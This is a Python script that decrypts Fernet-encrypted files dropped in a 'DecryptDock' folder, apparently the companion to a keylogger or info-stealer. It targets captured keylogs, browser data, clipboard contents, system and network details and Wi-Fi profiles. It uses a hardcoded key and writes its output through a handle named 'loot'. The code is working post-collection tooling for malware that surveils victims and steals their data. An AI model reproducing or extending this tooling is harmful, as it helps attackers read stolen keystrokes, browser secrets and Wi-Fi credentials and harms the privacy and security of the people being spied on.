# pylint: disable=W0106
""" Built-in modules """
import os
import re
import sys

# External modules #
from cryptography.fernet import Fernet


def print_err(msg: str):
    """
    Displays the passed in error message through stderr.

    :param msg:  The error message to be displayed.
    :return:  Nothing
    """
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


def main():
    """
    Decrypts the encrypted contents in the DecryptDock Folder.

    :return:  Nothing
    """
    encrypted_files = ['e_network_info.txt', 'e_system_info.txt',
                       'e_browser_info.txt', 'e_key_logs.txt']

    # If the OS is Windows #
    if os.name == 'nt':
        re_xml = re.compile(r'.{1,255}\.xml$')

        # Add any of the xml files in the dir to the encrypted files list #
        [encrypted_files.append(file.name) for file in os.scandir(decrypt_path)
         if re_xml.match(file.name)]

        encrypted_files.append('e_clipboard_info.txt')
    else:
        encrypted_files.append('e_wifi_info.txt')

    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    # Iterate through the files to be decrypted #
    for file_decrypt in encrypted_files:
        try:
            # Read the encrypted file data #
            with open(f'{decrypt_path}{file_decrypt}', 'rb') as in_file:
                data = in_file.read()

            # Decrypt the encrypted file data #
            decrypted = Fernet(key).decrypt(data)

            # Write the decrypted data to fresh file #
            with open(f'{decrypt_path}{file_decrypt[2:]}', 'wb') as loot:
                loot.write(decrypted)

            # Remove original encrypted files #
            os.remove(f'{decrypt_path}{file_decrypt}')

        # If file IO error occurs #
        except (IOError, OSError) as io_err:
            print_err(f'Error occurred during {file_decrypt} decryption: {io_err}')


if __name__ == '__main__':
    # Get the current working dir #
    cwd = os.getcwd()

    # If the OS is Windows #
    if os.name == 'nt':
        decrypt_path = f'{cwd}\\DecryptDock\\'
    # If the OS is Linux #
    else:
        decrypt_path = f'{cwd}/DecryptDock/'

    # If the decryption file dock does not exist #
    if not os.path.isdir(decrypt_path):
        # Create missing DecryptDock #
        os.mkdir(decrypt_path)
        # Print error message and exit #
        print_err('DecryptDock created due to not existing .. place '
                 'encrypted components in it and restart program')
        sys.exit(1)

    try:
        main()

    except KeyboardInterrupt:
        print('* Ctrl + C detected...program exiting *')

    sys.exit(0)
